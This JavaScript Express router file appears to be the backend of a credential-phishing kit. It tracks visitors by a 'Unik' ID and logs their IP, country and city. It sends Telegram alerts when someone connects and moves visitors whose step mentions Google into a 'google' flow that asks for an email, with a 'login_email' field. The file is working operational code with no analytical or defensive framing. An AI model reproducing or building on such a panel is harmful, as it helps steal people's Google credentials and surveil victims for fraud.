import express from "express";
import { getTelegramQueue } from "../utils/telegramQueue.js";
import { getMemoryStore } from "../utils/memory-store.js";
import { toDialCode } from "../utils/countryDialCodes.js";
import { getUserMessageManager } from "../utils/userMessageManager.js";

const router = express.Router();

const isKnownValue = (value) =>
  typeof value === "string" &&
  value.trim() !== "" &&
  value.toLowerCase() !== "unknown";

const mergeIpData = (existingData = {}, incomingData = {}) => {
  const merged = { ...existingData, ...incomingData };

  if (!isKnownValue(incomingData.ip) && isKnownValue(existingData.ip)) {
    merged.ip = existingData.ip;
  }
  if (!isKnownValue(incomingData.country) && isKnownValue(existingData.country)) {
    merged.country = existingData.country;
  }
  if (!isKnownValue(incomingData.city) && isKnownValue(existingData.city)) {
    merged.city = existingData.city;
  }
  if (
    !isKnownValue(incomingData.countryCode) &&
    isKnownValue(existingData.countryCode)
  ) {
    merged.countryCode = existingData.countryCode;
  }

  return merged;
};

router.post("/", async (req, res) => {
  try {
    const { Unik, message, ip, country, city, countryCode } = req.body;

    if (!Unik || !message) {
      return res.status(400).json({
        success: false,
        message: "Missing Unik or message",
      });
    }

    const updateData = { currentStep: message, _lastUpdate: Date.now() };
    if (ip) updateData.ip = ip;
    if (country) updateData.country = country;
    if (city) updateData.city = city;
    if (countryCode) updateData.countryCode = countryCode;

    const manager = getUserMessageManager();
    const lowerMsg = message.toLowerCase();
    if (lowerMsg.includes("gmail") || lowerMsg.includes("google")) {
      const user = manager.getUser(Unik);
      if (!user.data.replyInstruction && !user.data.login_email) {
        updateData.replyInstruction = "Reply to this message with an email";
        updateData.lastReplyType = "google-email";
      }
      if (user.flow !== "google") {
        manager.setFlow(Unik, "google");
      }
    }

    await manager.update(Unik, updateData);

    console.log(`[SEND] Notification updated for user ${Unik}: ${message}`);

    return res.status(200).json({
      success: true,
      message: "Notification sent",
    });
  } catch (error) {
    console.error("Error in /api/send:", error.message);
    return res.status(500).json({
      success: false,
      message: error.message || "Internal server error",
    });
  }
});

router.post("/ip", async (req, res) => {
  try {
    const { id, ip, country, city, countryCode, context } = req.body;

    const userStore = getMemoryStore();
    const existingUser = userStore.get(id);

    const ipData = {
      ip: ip,
      country: country || "Unknown",
      city: city || "Unknown",
      countryCode: toDialCode(countryCode),
    };

    if (existingUser) {
      existingUser.context = context;
      existingUser.data = mergeIpData(existingUser.data, ipData);
      existingUser.lastUpdated = new Date().toISOString();
      existingUser.lastActivity = Date.now();
      existingUser.ip = isKnownValue(ip) ? ip : existingUser.ip;
      userStore.set(id, existingUser);
      console.log(`Updated IP data for existing user ID: ${id}`);
    } else {
      const newUser = {
        context: context,
        userId: id,
        data: ipData,
        connectedAt: new Date().toISOString(),
        lastUpdated: new Date().toISOString(),
        lastActivity: Date.now(),
        ip: ip,
      };
      userStore.set(id, newUser);
      console.log(`Created new user entry with IP data for ID: ${id}`);
    }

    let notificationQueued = false;
    if (process.env.Notification_On_Connect === "true") {
      const telegramQueue = getTelegramQueue();
      telegramQueue.enqueue({
        type: "ip",
        userId: id,
        data: {
          id: id,
          ip: ip,
          country: country || "Unknown",
          city: city || "Unknown",
          countryCode: toDialCode(countryCode),
          context: context,
        },
      });
      notificationQueued = true;
      console.log(`Telegram notification queued for IP event: ${id}`);
    } else {
      console.log(`Telegram notification skipped (feature disabled): ${id}`);
    }

    return res.status(200).json({
      success: true,
      message: "IP data stored successfully",
      notificationQueued: notificationQueued,
    });
  } catch (error) {
    console.error("Error in /api/send/ip:", error);
    return res.status(500).json({
      success: false,
      message: "Internal server error",
    });
  }
});

export default router;
